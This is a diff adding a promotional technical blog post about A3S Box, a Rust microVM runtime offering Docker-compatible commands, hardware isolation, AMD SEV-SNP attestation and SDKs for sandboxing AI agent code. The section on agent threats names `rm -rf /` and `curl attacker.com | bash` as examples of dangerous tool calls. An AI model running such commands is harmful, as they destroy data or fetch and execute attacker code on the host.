@@ -1,0 +1,2356 @@
+---
+title: A 40MB MicroVM Runtime Written in Rust — A Perfect Docker Replacement for AI Agent Sandboxes
+description: A deep dive into A3S Box architecture — 200ms cold start, 52 Docker-compatible commands, hardware-level isolation, and confidential computing
+date: "2026-02-19"
+author: A3S Lab
+tags: [box, microvm, rust, tee, docker, ai-agent]
+---
+
+> When we strip away all the technical jargon and return to the essence of computing, a core question emerges: **Can we run every workload on its own operating system kernel while maintaining container-level startup speed and developer experience?** A3S Box answers with a definitive yes — a single 40MB binary, no daemon, 200ms cold start, 52 Docker-compatible commands, hardware-level isolation, and optional confidential computing.
+
+---
+
+## Table of Contents
+
+1. [Introduction: Why We Need to Rethink Container Runtimes](#1-introduction-why-we-need-to-rethink-container-runtimes)
+2. [First Principles: Starting from the Fundamental Question](#2-first-principles-starting-from-the-fundamental-question)
+3. [Architecture Overview: Seven Crates in Precise Collaboration](#3-architecture-overview-seven-crates-in-precise-collaboration)
+4. [Core Value 1: True Hardware-Level Isolation](#4-core-value-1-true-hardware-level-isolation)
+5. [Core Value 2: Confidential Computing and Zero-Trust Security](#5-core-value-2-confidential-computing-and-zero-trust-security)
+6. [Core Value 3: MicroVM with 200ms Cold Start](#6-core-value-3-microvm-with-200ms-cold-start)
+7. [Core Value 4: Full Docker-Compatible Experience](#7-core-value-4-full-docker-compatible-experience)
+8. [Core Value 5: Secure Isolation Sandbox for AI Agents](#8-core-value-5-secure-isolation-sandbox-for-ai-agents)
+9. [Deep Dive: VM Lifecycle State Machine](#9-deep-dive-vm-lifecycle-state-machine)
+10. [TEE Confidential Computing: The Trust Chain from Hardware to Application](#10-tee-confidential-computing-the-trust-chain-from-hardware-to-application)
+11. [Vsock Communication Protocol: The Bridge Between Host and Guest](#11-vsock-communication-protocol-the-bridge-between-host-and-guest)
+12. [OCI Image Processing Pipeline: From Registry to Root Filesystem](#12-oci-image-processing-pipeline-from-registry-to-root-filesystem)
+13. [Network Architecture: Three Flexible Modes](#13-network-architecture-three-flexible-modes)
+14. [Guest Init: PID 1 Inside the MicroVM](#14-guest-init-pid-1-inside-the-microvm)
+15. [Warm Pool: The Ultimate Solution to Cold Starts](#15-warm-pool-the-ultimate-solution-to-cold-starts)
+16. [Seven-Layer Defense-in-Depth Security Model](#16-seven-layer-defense-in-depth-security-model)
+17. [Observability: Prometheus, OpenTelemetry, and Auditing](#17-observability-prometheus-opentelemetry-and-auditing)
+18. [Kubernetes Integration: CRI Runtime](#18-kubernetes-integration-cri-runtime)
+19. [SDK Ecosystem: Unified Rust, Python, and TypeScript](#19-sdk-ecosystem-unified-rust-python-and-typescript)
+20. [Comparative Analysis with Existing Solutions](#20-comparative-analysis-with-existing-solutions)
+21. [Future Outlook and Summary](#21-future-outlook-and-summary)
+
+---
+
+## 1. Introduction: Why We Need to Rethink Container Runtimes
+
+Over the past decade, Docker and container technology have fundamentally transformed how software is delivered. Developers can package applications and their dependencies into a standardized image and run it in any environment that supports a container runtime. This "build once, run anywhere" philosophy has dramatically improved development efficiency and deployment consistency.
+
+However, as cloud-native architectures have matured, the fundamental limitations of traditional container runtimes have become increasingly apparent:
+
+**The shared-kernel security dilemma.** Traditional containers (such as runc used by Docker) are essentially Linux kernel process isolation mechanisms — resource isolation through namespaces and cgroups. But all containers share the same host kernel. This means a single kernel vulnerability (such as CVE-2022-0185 or CVE-2022-0847 "Dirty Pipe") can allow an attacker to escape from any container to the host, gaining control over all workloads on the same node.
+
+**The trust crisis in multi-tenant environments.** In public cloud and edge computing scenarios, workloads from different tenants run on the same physical hardware. Even with container isolation, there is no hardware-level trust boundary between tenants. Cloud service provider administrators can theoretically access any tenant's in-memory data — which is unacceptable when handling medical records, financial data, or personal privacy information.
+
+**The performance-security tradeoff.** Existing solutions either sacrifice performance for security (traditional VMs take seconds to tens of seconds to start) or sacrifice security for performance (containers provide insufficient isolation strength). Projects like Kata Containers and Firecracker attempt to find a balance between the two, but each still has its own limitations.
+
+A3S Box was created precisely to fundamentally resolve this contradiction.
+
+> 📖 For complete documentation and API reference, visit: [https://a3s-lab.github.io/a3s/](https://a3s-lab.github.io/a3s/)
+
+---
+
+## 2. First Principles: Starting from the Fundamental Question
+
+To understand A3S Box's design decisions, we need to set aside analogies and conventions, return to the most basic facts, and reason upward from there. Let's re-examine "running a workload" through this lens.
+
+### 2.1 What Is the Essence of Workload Isolation?
+
+From a physics perspective, isolation means there are no channels for information leakage between two systems. In computing, this means:
+
+1. **Memory isolation**: Workload A cannot read or write workload B's memory space
+2. **Execution isolation**: Workload A's code execution does not affect workload B's execution flow
+3. **I/O isolation**: Workload A's input/output cannot be intercepted or tampered with by workload B
+4. **Temporal isolation**: Workload A's resource consumption does not cause performance degradation for workload B
+
+Traditional containers only implement these isolations at the operating system level — through the kernel's namespace and cgroup mechanisms. But the kernel itself is shared, meaning the strength of isolation depends on the correctness of the kernel code. The Linux kernel has over 30 million lines of code, with hundreds of security vulnerabilities discovered each year. Relying on such a massive codebase to guarantee isolation is fundamentally unreliable.
+
+### 2.2 Hardware Isolation Is the Only Fundamental Solution
+
+If we cannot trust software to provide perfect isolation, the only option is to leverage hardware. Modern processors provide two levels of hardware isolation:
+
+**Level 1: Virtualization extensions (Intel VT-x / AMD-V / Apple HVF).** The processor distinguishes between host mode (VMX root) and guest mode (VMX non-root) at the hardware level. Code running in guest mode cannot directly access the host's memory or devices; any sensitive operation triggers a VM Exit, handled by the host's VMM (Virtual Machine Monitor). This provides much stronger guarantees than OS-level isolation.
+
+**Level 2: Memory encryption (AMD SEV-SNP / Intel TDX).** Going further, modern processors can hardware-encrypt a virtual machine's memory. Even an attacker with physical access (including cloud service provider administrators) cannot read the plaintext data in VM memory. This is what's known as "Confidential Computing."
+
+### 2.3 A3S Box's Core Insight
+
+A3S Box's core insight can be summarized in one sentence:
+
+> **MicroVM + Confidential Computing + Container Experience = Unity of Security and Efficiency**
+
+Specifically:
+
+- **One MicroVM per workload**: Using libkrun to start a lightweight virtual machine in ~200ms, each workload has its own independent Linux kernel. This is not container-level "fake isolation" but hardware-enforced true isolation.
+- **Optional confidential computing**: On hardware supporting AMD SEV-SNP, the MicroVM's memory is hardware-encrypted. Even if the host machine is completely compromised, attackers cannot read data inside the MicroVM.
+- **Docker-compatible user experience**: 52 Docker-compatible commands — developers don't need to learn new tools. `a3s-box run nginx` is as simple as `docker run nginx`, but with a completely different security model underneath.
+
+The combination of these three elements makes A3S Box not an incremental improvement over existing container runtimes, but a paradigm shift — from "process isolation with a shared kernel" to "hardware isolation with independent kernels."
+
+### 2.4 Why libkrun?
+
+When choosing a virtualization backend, A3S Box selected libkrun over QEMU or Firecracker. This choice also went through rigorous technical evaluation:
+
+| Dimension | QEMU | Firecracker | libkrun |
+| ---------- | ---------------- | ----------- | ------------ |
+| Startup time | Seconds | ~125ms | ~200ms |
+| Memory overhead | Tens of MB | ~5 MB | ~10 MB |
+| Code complexity | Very high (millions of lines) | Medium | Low (library form) |
+| macOS support | Limited | Not supported | Native HVF |
+| Linux support | KVM | KVM | KVM |
+| Embedding method | Separate process | Separate process | Library call |
+
+libkrun's unique advantage is that it is a **library** rather than a standalone process. This means A3S Box can embed the VMM directly into its own process space, reducing inter-process communication overhead, while providing native support on macOS through Apple Hypervisor Framework (HVF) — which is critical for developer experience, as many developers use macOS for daily development.
+
+---
+
+## 3. Architecture Overview: Seven Crates in Precise Collaboration
+
+A3S Box is written in Rust, with the entire project consisting of seven crates, 218 source files, 1,466 unit tests, and 7 integration tests. This modular design follows the "minimal core + external extensions" architectural philosophy.
+
+### 3.1 Crate Topology
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                        a3s-box-cli                              │
+│                  52 Docker-compatible commands                   │
+│                       (361 tests)                               │
+├─────────────────────────────────────────────────────────────────┤
+│                       a3s-box-sdk                               │
+│              Rust / Python / TypeScript SDK                     │
+├──────────────────────┬──────────────────────────────────────────┤
+│   a3s-box-cri        │           a3s-box-runtime                │
+│  Kubernetes CRI      │  VM lifecycle, OCI, TEE, networking      │
+│                      │           (678 tests)                    │
+├──────────────────────┴──────────────────────────────────────────┤
+│                       a3s-box-core                              │
+│        Config, error types, events, Trait definitions           │
+│                       (331 tests)                               │
+├─────────────────────────────────────────────────────────────────┤
+│  a3s-box-shim        │        a3s-box-guest-init                │
+│  libkrun bridge shim │  Guest PID 1 / Exec / PTY / Attestation  │
+├──────────────────────┴──────────────────────────────────────────┤
+│                      libkrun-sys                                │
+│                   libkrun FFI bindings                          │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### 3.2 Crate Responsibilities
+
+**a3s-box-core (Core Layer)**: Defines all core abstractions — configuration structs, error types (`BoxError` enum with 15 variants), event system, and key Trait interfaces. This is the "contract layer" of the entire system; all other crates depend on it, but it depends on no other A3S crates.
+
+**a3s-box-runtime (Runtime Layer)**: Implements VM lifecycle management, OCI image pulling and caching, TEE confidential computing, network configuration, warm pool, auto-scaling, and other core functionality. This is the most complex crate in the system, with 678 unit tests.
+
+**a3s-box-cli (CLI Layer)**: Provides 52 Docker-compatible commands and is the primary interface for user interaction with the system. It translates user commands into calls to the runtime layer.
+
+**a3s-box-shim (VMM Bridge Layer)**: Runs as an independent subprocess, responsible for calling the libkrun FFI interface to create and manage MicroVMs. This process-isolation design ensures that a VMM crash does not affect the main process.
+
+**a3s-box-guest-init (Guest Initialization)**: Compiled as a static binary, runs as PID 1 inside the MicroVM. Responsible for mounting filesystems, configuring networking, and starting Exec/PTY/Attestation servers.
+
+**a3s-box-cri (Kubernetes Integration Layer)**: Implements the CRI (Container Runtime Interface) protocol, allowing A3S Box to run as a Kubernetes RuntimeClass.
+
+**a3s-box-sdk (SDK Layer)**: Provides an embedded Rust SDK, and generates Python and TypeScript bindings via PyO3 and napi-rs respectively.
+
+### 3.3 Core Trait System
+
+A3S Box's extensibility is built on a set of carefully designed Traits. These Traits define the system's extension points, and each Trait has a default implementation to ensure the system works out of the box:
+
+| Trait | Responsibility | Default Implementation |
+| ---------------------- | ------------------------ | ----------------------------------- |
+| `VmmProvider` | Start VM from InstanceSpec | `VmController` (shim subprocess) |
+| `VmHandler` | Lifecycle operations for running VMs | `ShimHandler` |
+| `ImageRegistry` | OCI image pulling and caching | `RegistryPuller` |
+| `CacheBackend` | Directory-level LRU cache | `RootfsCache` |
+| `MetricsCollector` | Runtime metrics collection | `RuntimeMetrics` (Prometheus) |
+| `TeeExtension` | TEE attestation, sealing, key injection | `SnpTeeExtension` |
+| `AuditSink` | Audit event persistence | JSON-lines file |
+| `CredentialProvider` | Registry authentication | Docker config.json |
+| `EventBus` | Event publish/subscribe | `EventEmitter` (tokio broadcast) |
+
+The elegance of this design lies in: the core components (5) remain stable and non-replaceable, while the extension points (14) can evolve independently. Users can replace any extension without touching the core — this is the embodiment of the "minimal core + external extensions" principle.
+
+---
+
+## 4. Core Value 1: True Hardware-Level Isolation
+
+### 4.1 From Namespaces to Hypervisor
+
+The isolation model of traditional containers can be compared to "different rooms in the same building" — there are walls between rooms (namespaces), but they share the same foundation (kernel). If the foundation cracks, all rooms are affected.
+
+A3S Box's isolation model is "a separate building for each workload" — each MicroVM has its own Linux kernel, isolated from the host through hardware virtualization extensions (Intel VT-x / AMD-V / Apple HVF). Even if an attacker gains root privileges inside a MicroVM and exploits a kernel vulnerability, they can only affect that MicroVM itself — because the VM Exit mechanism ensures that any sensitive operation must be reviewed by the host's VMM.
+
+### 4.2 Layered Isolation
+
+A3S Box doesn't rely solely on virtualization for isolation. It also stacks multiple OS-level isolation layers inside the MicroVM, forming a defense-in-depth:
+
+```
+┌─────────────────────────────────────────┐
+│            Application Process           │
+├─────────────────────────────────────────┤
+│  Seccomp BPF │ Capabilities │ no-new-priv│  <- Syscall level
+├─────────────────────────────────────────┤
+│  Mount NS │ PID NS │ IPC NS │ UTS NS    │  <- Namespace level
+├─────────────────────────────────────────┤
+│  cgroup v2 (CPU/Memory/PID limits)      │  <- Resource limit level
+├─────────────────────────────────────────┤
+│           Independent Linux Kernel       │  <- Kernel level
+├─────────────────────────────────────────┤
+│     Hardware Virtualization (VT-x / AMD-V / HVF)  │  <- Hardware level
+├─────────────────────────────────────────┤
+│  AMD SEV-SNP / Intel TDX (optional)     │  <- Memory encryption level
+└─────────────────────────────────────────┘
+```
+
+This multi-layer stacking design means that even if one layer is breached, the attacker still faces obstacles from other layers. This is not "choose the strongest single layer," but "every layer increases the cost of attack."
+
+### 4.3 Guest Init's Secure Boot Chain
+
+The PID 1 process inside the MicroVM (`a3s-box-guest-init`) is a critical link in the security model. It is compiled as a statically linked Rust binary, with no dependency on any dynamic libraries, minimizing the attack surface.
+
+Guest Init startup sequence:
+
+1. Mount base filesystems: `/proc` (procfs), `/sys` (sysfs), `/dev` (devtmpfs)
+2. Mount virtio-fs shared filesystem (rootfs passed in from host)
+3. Configure network interface (via raw syscalls, no dependency on `iproute2`)
+4. Apply security policies (Seccomp, Capabilities, no-new-privileges)
+5. Start three vsock servers:
+   - Port 4089: Exec server (command execution)
+   - Port 4090: PTY server (interactive terminal)
+   - Port 4091: Attestation server (TEE attestation, TEE mode only)
+6. Wait for host connection
+
+The entire process requires no systemd, no shell, no userspace tools — this is a minimal, security-designed initialization flow.
+
+---
+
+## 5. Core Value 2: Confidential Computing and Zero-Trust Security
+
+### 5.1 What Is Confidential Computing?
+
+Confidential Computing is a hardware security technology that protects data while it is being processed (in-use). Traditional security measures protect data at rest (via disk encryption) and data in transit (via TLS), but data being processed typically exists in plaintext in memory.
+
+AMD SEV-SNP (Secure Encrypted Virtualization - Secure Nested Paging) changes this through the following mechanisms:
+
+- **Memory encryption**: Each virtual machine has an independent AES encryption key, managed by the processor's security processor (PSP). The host's VMM cannot read the VM's memory in plaintext.
+- **Integrity protection**: SNP (Secure Nested Paging) adds memory integrity protection on top of SEV-ES, preventing the host from tampering with the VM's memory contents.
+- **Remote attestation**: The VM can generate a hardware-signed attestation report, proving it is running on genuine AMD SEV-SNP hardware and that the initial memory contents (measurement) have not been tampered with.
+
+### 5.2 A3S Box's TEE Implementation
+
+A3S Box's TEE subsystem contains 12 modules, covering the complete chain from hardware detection to application-layer key management:
+
+**Hardware detection**: At system startup, the system automatically probes `/dev/sev-guest`, `/dev/sev`, `/dev/tdx_guest` device files, and the `/sys/module/kvm_amd/parameters/sev_snp` parameter. If hardware is unavailable but the `A3S_TEE_SIMULATE=1` environment variable is set, it enters simulation mode — which is critical for development and testing.
+
+**Attestation report generation**: When a verifier sends an `AttestationRequest` containing a nonce and optional user_data, Guest Init combines them via SHA-512 into a 64-byte `report_data`, then calls the `/dev/sev-guest` device via `SNP_GET_REPORT` ioctl to generate an attestation report. The report is 1184 bytes and contains:
+
+```
+Offset 0x00-0x04: version (u32 LE)        — report format version
+Offset 0x04-0x08: guest_svn (u32 LE)      — guest security version number
+Offset 0x08-0x10: policy (u64 LE)         — security policy flags
+Offset 0x38-0x40: current_tcb             — trusted computing base version
+Offset 0x90-0xC0: measurement (48 bytes)  — SHA-384 hash of initial memory
+Offset 0x1A0-0x1E0: chip_id (64 bytes)   — physical processor unique identifier
+```
+
+**Certificate chain verification**: A3S Box implements complete AMD certificate chain verification:
+
+```
+AMD Root Key (ARK)          <- AMD's hardcoded root trust anchor
+    |
+    +-- AMD SEV Key (ASK)   <- Intermediate certificate
+    |       |
+    |       +-- VCEK        <- Chip-level certificate (unique per physical processor)
+    |               |
+    |               +-- SNP Report Signature  <- Attestation report signature
+```
+
+Certificates are obtained from AMD's KDS (Key Distribution Service): `https://kds.amd.com/vcek/v1/{product}/{chip_id}`, and cached locally to avoid repeated network requests.
+
+### 5.3 RA-TLS: Embedding Attestation into TLS
+
+RA-TLS (Remote Attestation TLS) is a key innovation in A3S Box. It embeds the SNP attestation report into the extension fields of an X.509 certificate, so that the TLS handshake process simultaneously completes both identity verification and remote attestation.
+
+This means: when the host establishes a TLS connection with the MicroVM, it not only verifies the identity of the communication peer, but also verifies that the peer is indeed running in a trusted TEE environment. This eliminates the TOCTOU (Time-of-Check-Time-of-Use) vulnerability that arises from separating attestation and communication in traditional approaches.
+
+### 5.4 Sealed Storage
+
+Sealed Storage allows a MicroVM to encrypt and persist sensitive data, which can only be decrypted in the same (or compatible) TEE environment. A3S Box uses AES-256-GCM encryption, HKDF-SHA256 key derivation, and provides three sealing policies:
+
+| Policy | Binding Factor | Use Case |
+| ---------------------- | ---------------------- | ------------------------------------ |
+| `MeasurementAndChip` | Image hash + physical chip ID | Strictest: data bound to specific image and specific hardware |
+| `MeasurementOnly` | Image hash only | Can migrate across hardware, but must be the same image |
+| `ChipOnly` | Physical chip ID only | Survives firmware updates, but bound to specific hardware |
+
+Additionally, sealed storage implements version-based rollback protection (`VersionStore`), preventing attackers from replacing newer sealed data with older versions.
+
+---
+
+## 6. Core Value 3: MicroVM with 200ms Cold Start
+
+### 6.1 Why Does Startup Speed Matter?
+
+In serverless and event-driven architectures, workload lifetimes may be only a few hundred milliseconds to a few seconds. If a virtual machine takes seconds to start, the startup overhead would account for a large proportion of the total workload time, making MicroVM solutions impractical in these scenarios.
+
+A3S Box achieves approximately 200ms cold start time through libkrun. This number means:
+
+- For a serverless function with 1-second execution time, startup overhead is only 20%
+- For interactive workloads, users barely perceive the startup delay
+- In CI/CD scenarios, each build step can run in an independent MicroVM without significantly increasing total build time
+
+### 6.2 Startup Flow Optimization
+
+A3S Box's startup flow is carefully optimized:
+
+```
+[0ms]    VmController::start() is called
+[5ms]    Locate a3s-box-shim binary
+[10ms]   macOS: check/sign hypervisor entitlement
+[15ms]   Serialize InstanceSpec to JSON
+[20ms]   Start shim subprocess
+[25ms]   shim calls libkrun FFI to create VM context
+[30ms]   Configure vCPU, memory, virtio-fs, vsock
+[50ms]   libkrun starts VM (kernel boot)
+[150ms]  Guest Init (PID 1) begins execution
+[160ms]  Mount filesystems
+[170ms]  Configure networking
+[180ms]  Start vsock servers
+[200ms]  VM ready, accepting commands
+```
+
+### 6.3 Warm Pool: Eliminating Cold Starts
+
+For scenarios extremely sensitive to latency, A3S Box provides a Warm Pool mechanism — pre-starting a batch of MicroVMs so that when a request arrives, a ready VM is directly allocated, achieving near-zero startup latency.
+
+Core warm pool parameters:
+
+- `min_idle`: Minimum number of idle VMs (default 1)
+- `max_size`: Maximum number of VMs in the pool (default 5)
+- `idle_ttl_secs`: Idle VM time-to-live (default 300 seconds)
+
+The warm pool also integrates an auto-scaler (`PoolScaler`) that dynamically adjusts `min_idle` based on hit/miss rates within a sliding window:
+
+- When the miss rate exceeds `scale_up_threshold` (default 0.3), increase the number of pre-warmed VMs
+- When the miss rate falls below `scale_down_threshold` (default 0.05), decrease the number of pre-warmed VMs
+- A cooldown period (default 60 seconds) prevents frequent oscillation
+
+---
+
+## 7. Core Value 4: Full Docker-Compatible Experience
+
+### 7.1 52 Docker-Compatible Commands
+
+A3S Box provides 52 Docker CLI-compatible commands, covering all aspects of container lifecycle management. Developers can seamlessly migrate existing Docker workflows to A3S Box without modifying scripts or learning new command syntax.
+
+Core command examples:
+
+```bash
+# Run a MicroVM (equivalent to docker run)
+a3s-box run -d --name my-app -p 8080:80 nginx:latest
+
+# Execute a command (equivalent to docker exec)
+a3s-box exec my-app cat /etc/nginx/nginx.conf
+
+# Interactive terminal (equivalent to docker exec -it)
+a3s-box exec -it my-app /bin/bash
+
+# View logs
+a3s-box logs my-app
+
+# List running MicroVMs
+a3s-box ps
+
+# Stop and remove
+a3s-box stop my-app
+a3s-box rm my-app
+
+# Image management
+a3s-box images
+a3s-box pull ubuntu:22.04
+a3s-box push myregistry.io/my-image:v1
+
+# Network management
+a3s-box network create my-network
+a3s-box network connect my-network my-app
+
+# Volume management
+a3s-box volume create my-data
+a3s-box run -v my-data:/data my-app
+
+# Audit query
+a3s-box audit --filter "action=exec"
+```
+
+### 7.2 Why Is Compatibility So Important?
+
+From a technology adoption perspective, whether a new technology is widely accepted depends on two factors: **value increment** and **migration cost**.
+
+A3S Box's value increment is enormous — upgrading from shared-kernel isolation to hardware-level isolation, with optional confidential computing. But if the migration cost is equally enormous (needing to rewrite all deployment scripts, learn a completely new CLI, change team workflows), most teams will choose to stay with existing solutions.
+
+By providing a Docker-compatible CLI, A3S Box reduces migration cost to a minimum:
+
+```bash
+# Before migration
+docker run -d --name app -p 8080:80 nginx
+
+# After migration (just replace the command name)
+a3s-box run -d --name app -p 8080:80 nginx
+```
+
+This is not just a command name replacement. A3S Box is compatible with Docker's image format (OCI standard), network model, volume mount semantics, and environment variable passing. Existing Dockerfiles can be used without modification.
+
+---
+
+## 8. Core Value 5: Secure Isolation Sandbox for AI Agents
+
+### 8.1 Security Challenges in the AI Agent Era
+
+Large language model (LLM)-driven AI Agents are evolving from "conversational assistants" to "autonomous executors" — they not only generate text, but can also write code, call tools, manipulate filesystems, and initiate network requests. This leap in capability brings entirely new security challenges:
+
+**Untrusted code execution.** Code generated by AI Agents is inherently untrusted. Even the most advanced LLMs may generate malicious code due to hallucination, prompt injection, or adversarial inputs. Executing such code in an unprotected environment is equivalent to handing control of the host machine to an unpredictable entity.
+
+**Side effects of tool calls.** Agents interact with the external world through tools — executing shell commands, reading/writing files, accessing databases, calling APIs. Each tool call may produce irreversible side effects. If an Agent directly executes `rm -rf /` or `curl attacker.com | bash` on the host machine, the consequences would be catastrophic.
+
+**Multi-tenant Agent platforms.** SaaS platforms run Agents from different users, each with different permission levels and trust levels. A malicious user's Agent should not be able to affect other users' Agents or the platform itself.
+
+### 8.2 Why Traditional Containers Are Not Enough?
+
+Many AI Agent frameworks use Docker containers as sandboxes. But as analyzed in Section 1, traditional container isolation is based on the shared-kernel namespace mechanism — a single kernel vulnerability can allow malicious code generated by an Agent to escape to the host machine.
+
+For AI Agent scenarios, this risk is amplified:
+
+- **Larger attack surface**: Agents may execute arbitrary syscalls, increasing the probability of probing kernel vulnerabilities
+- **Higher attack frequency**: Agents continuously generate and execute code, with each execution being a potential attack attempt
+- **Higher attack intelligence**: LLMs have the ability to understand and exploit vulnerabilities, unlike traditional random fuzzing
+
+A3S Box's MicroVM isolation fundamentally solves this problem — even if code generated by an Agent exploits a zero-day Linux kernel vulnerability, it cannot break through the hardware virtualization boundary.
+
+### 8.3 SDK-Driven Sandbox Integration
+
+A3S Box is not just a command-line tool, but an embeddable sandbox runtime. Through Rust/Python/TypeScript SDKs, AI Agent frameworks can integrate A3S Box directly into their own code as a library:
+
+**Python Agent framework integration example:**
+
+```python
+from a3s_box import BoxSdk, SandboxOptions
+
+class SecureAgentExecutor:
+    def __init__(self):
+        self.sdk = BoxSdk()
+
+    async def execute_agent_code(self, code: str, language: str = "python"):
+        """Execute Agent-generated code in an isolated sandbox"""
+
+        # Create a one-time sandbox (independent MicroVM)
+        sandbox = self.sdk.create(SandboxOptions(
+            image=f"{language}:3.11",
+            vcpus=2,
+            memory_mib=512,
+        ))
+
+        # Execute untrusted code in the sandbox
+        result = sandbox.exec([language, "-c", code])
+
+        return {
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "exit_code": result.exit_code,
+        }
+        # sandbox is automatically destroyed when scope ends
+```
+
+**TypeScript Agent framework integration example:**
+
+```typescript
+import { BoxSdk } from '@a3s/box';
+
+class SecureToolExecutor {
+    private sdk = new BoxSdk();
+
+    async executeShellCommand(command: string): Promise<ToolResult> {
+        // Each tool call executes in an independent MicroVM
+        const sandbox = await this.sdk.create({
+            image: 'ubuntu:22.04',
+            vcpus: 1,
+            memoryMib: 256,
+        });
+
+        const output = await sandbox.exec(['bash', '-c', command]);
+
+        return {
+            success: output.exitCode === 0,
+            output: output.stdout,
+            error: output.stderr,
+        };
+    }
+}
+```
+
+The key advantage of this integration pattern is: **each code execution takes place in a brand new, isolated MicroVM**. Even if an Agent performs destructive operations in one execution (deleting files, modifying system configuration), it only affects that MicroVM itself — the next execution will start in a clean environment.
+
+### 8.4 Warm Pool Accelerates Agent Response
+
+AI Agents typically follow a "think-execute-observe" loop — the Agent generates code, executes it, observes the output, then decides the next step. The speed of this loop directly affects user experience.
+
+If each execution requires a 200ms cold start, an Agent task with 10 tool calls would add 2 seconds of extra latency. The warm pool mechanism plays a key role here:
+
+```
+Without warm pool:  [200ms start] [exec] [200ms start] [exec] [200ms start] [exec] ...
+                                                    Total extra latency: N x 200ms
+
+With warm pool:     [~0ms acquire] [exec] [~0ms acquire] [exec] [~0ms acquire] [exec] ...
+                                                    Total extra latency: ~0ms
+```
+
+The warm pool's auto-scaling is particularly suited for Agent scenarios — Agent tool calls are typically bursty (dense calls during a task, idle between tasks), and `PoolScaler` automatically adjusts the number of pre-warmed VMs based on hit rate.
+
+### 8.5 Seven-Layer Defense Against Agent Threats
+
+Each layer of A3S Box's seven-layer defense-in-depth has a clear defensive target in AI Agent scenarios:
+
+| Defense Layer | Agent Threat Countered |
+| ----------------- | ----------------------------------------------- |
+| Hardware virtualization | Agent exploiting kernel vulnerabilities to escape |
+| TEE memory encryption | Agent attempting to read other tenants' memory data |
+| Independent kernel | Agent's kernel-level attacks don't affect other sandboxes |
+| Namespaces | Agent cannot see processes and files outside the sandbox |
+| Capability stripping | Agent cannot perform privileged operations (e.g., mounting devices) |
+| Seccomp BPF | Agent cannot call dangerous syscalls (e.g., `kexec_load`) |
+| no-new-privileges | Agent cannot escalate privileges via SUID binaries |
+
+### 8.6 Auditing and Compliance
+
+In AI Agent platforms, audit capability is not only a security requirement but also a compliance requirement. Regulators are increasingly focused on the traceability of AI systems — "What did the AI do? When? What was the result?"
+
+A3S Box's 26 audit operations completely record every action of an Agent:
+
+- Which sandboxes the Agent created (`Create`)
+- Which commands the Agent executed (`Command`)
+- Which images the Agent pulled (`Pull`)
+- Whether the Agent's operations succeeded (`Success` / `Failure` / `Denied`)
+
+These audit logs are stored in structured JSON-lines format and can be imported into any log analysis system for post-hoc review.
+
+### 8.7 Lightweight Deployment: ~40MB Complete Runtime
+
+The compiled binary size of A3S Box is only about 40MB — this includes the complete CLI, runtime, OCI image processing, TEE support, network management, warm pool, audit system, and all other functionality.
+
+The significance of this number:
+
+- **Compared to Docker Engine**: Docker's full installation exceeds 200MB and requires multiple components like containerd and runc
+- **Compared to QEMU**: QEMU's installation package typically exceeds 100MB and depends on many dynamic libraries
+- **Edge deployment friendly**: A 40MB single binary can be easily deployed to IoT devices, edge nodes, and other storage-constrained environments
+- **Minimal container image**: A3S Box itself can be packaged as a minimal container image, making it easy to deploy as a DaemonSet in Kubernetes
+
+This extreme binary size is thanks to Rust's zero-cost abstractions and compile-time optimization — no runtime virtual machine, no garbage collector, no large standard library runtime. The statically linked Guest Init binary is only a few MB, ensuring a minimal attack surface inside the MicroVM.
+
+For AI Agent platforms, lightweight deployment means A3S Box can be quickly deployed on each compute node without consuming precious disk space and network bandwidth. Combined with the warm pool mechanism, the entire system can scale from zero to hundreds of isolated sandboxes within minutes.
+
+---
+
+## 9. Deep Dive: VM Lifecycle State Machine
+
+### 9.1 BoxState State Machine
+
+A3S Box uses a strictly defined state machine to manage the lifecycle of each MicroVM. The state machine implements concurrency-safe state synchronization through `RwLock`:
+
+```
+Created --> Ready --> Busy --> Ready
+   |          |         |        |
+   |          |         |        +--> Compacting --> Ready
+   |          |         |
+   |          +---------+-----------> Stopped
+   |
+   +-----------------------------------> Stopped
+```
+
+State meanings:
+
+- **Created**: VM configuration has been generated but not yet started. At this point, `InstanceSpec` has been fully constructed, containing vCPU count, memory size, rootfs path, entrypoint, network configuration, TEE configuration, and all other parameters.
+- **Ready**: VM has started and is ready to accept commands. Guest Init has completed initialization, and vsock servers are listening.
+- **Busy**: VM is executing a command (exec or PTY session). In this state, new command requests are queued.
+- **Compacting**: VM is performing internal maintenance operations (such as log rotation, cache cleanup). This is a brief transitional state.
+- **Stopped**: VM has stopped. Can transition to this state from any state (normal shutdown or abnormal termination).
+
+### 9.2 VmController Startup Flow in Detail
+
+`VmController` is the default implementation of the `VmmProvider` trait, responsible for transforming an `InstanceSpec` into a running MicroVM:
+
+```rust
+// Simplified startup flow
+impl VmmProvider for VmController {
+    async fn start(&self, spec: InstanceSpec) -> Result<Box<dyn VmHandler>> {
+        // 1. Locate shim binary
+        let shim_path = Self::find_shim()?;
+  
+        // 2. macOS: ensure hypervisor entitlement
+        #[cfg(target_os = "macos")]
+        ensure_entitlement(&shim_path)?;
+  
+        // 3. Serialize configuration
+        let config_json = serde_json::to_string(&spec)?;
+  
+        // 4. Start shim subprocess
+        let child = Command::new(&shim_path)
+            .arg("--config")
+            .arg(&config_json)
+            .stdin(Stdio::null())
+            .spawn()?;
+  
+        // 5. Return ShimHandler
+        Ok(Box::new(ShimHandler::from_child(child)?))
+    }
+}
+```
+
+**Shim location strategy** (`find_shim`) searches in priority order:
+
+1. Same directory as the current executable
+2. `~/.a3s/bin/` user directory
+3. `target/debug` or `target/release` (development mode)
+4. System `PATH`
+
+This multi-level search strategy ensures the shim binary can be correctly found in development, testing, and production environments.
+
+### 9.3 macOS Entitlement Signing
+
+On macOS, using Apple Hypervisor Framework (HVF) requires the binary to have the `com.apple.security.hypervisor` entitlement. A3S Box handles this automatically:
+
+```rust
+fn ensure_entitlement(shim_path: &Path) -> Result<()> {
+    // Use file lock to prevent concurrent signing race conditions
+    let lock = FileLock::new(shim_path.with_extension("lock"))?;
+    let _guard = lock.lock()?;
+  
+    // Check if already signed
+    if has_entitlement(shim_path, "com.apple.security.hypervisor")? {
+        return Ok(());
+    }
+  
+    // Sign with codesign
+    Command::new("codesign")
+        .args(["--sign", "-", "--entitlements", entitlements_plist, 
+               "--force", shim_path.to_str().unwrap()])
+        .status()?;
+  
+    Ok(())
+}
+```
+
+The file lock mechanism ensures that no signing race conditions occur when multiple A3S Box instances start simultaneously.
+
+### 9.4 Graceful Shutdown and Forced Termination
+
